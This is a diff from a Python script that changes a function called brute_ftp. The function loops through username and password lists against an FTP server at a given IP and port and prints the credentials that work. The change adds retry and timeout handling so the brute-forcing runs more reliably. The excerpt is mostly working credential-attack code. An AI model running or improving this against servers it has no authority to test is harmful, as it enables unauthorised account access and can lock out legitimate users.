@@ -127,19 +127,27 @@ def brute_ftp(ip, port, username, passwords):
     for usr in username:
         passwordFound = False
         for pwd in passwords:
-            try:
-                ftp = ftplib.FTP()
-                ftp.connect(ip, port, timeout=5)  # connessione con porta personalizzata
-                ftp.login(usr, pwd)
-                print(f"[FTP] Success: {usr}:{pwd}")
-                ftp.quit()
-                passwordFound = True
-                break
-            except ftplib.error_perm:
-                print(f"[FTP] Failed: {usr}:{pwd}")
-            except Exception as e:
-                print(f"[FTP] Error: {e}")
-                time.sleep(1)
+            retry = True
+            while retry:
+                try:
+                    ftp = ftplib.FTP()
+                    ftp.connect(ip, port, timeout=5)  # connessione con porta personalizzata
+                    ftp.login(usr, pwd)
+                    print(f"[FTP] Success: {usr}:{pwd}")
+                    ftp.quit()
+                    passwordFound = True
+                    retry = False
+                    break
+                except ftplib.error_perm:
+                    print(f"[FTP] Failed: {usr}:{pwd}")
+                    retry = False
+                except socket.timeout:
+                    print(f"[FTP] Failed TimeOUT: {usr}:{pwd}")
+                    retry = False
+                except Exception as e:
+                    print(f"[FTP] Error: {e}")
+                    time.sleep(1)
+            if passwordFound == True: break
         if passwordFound == False:
             print(f"[FTP] No password found for {usr} on {ip}")
 
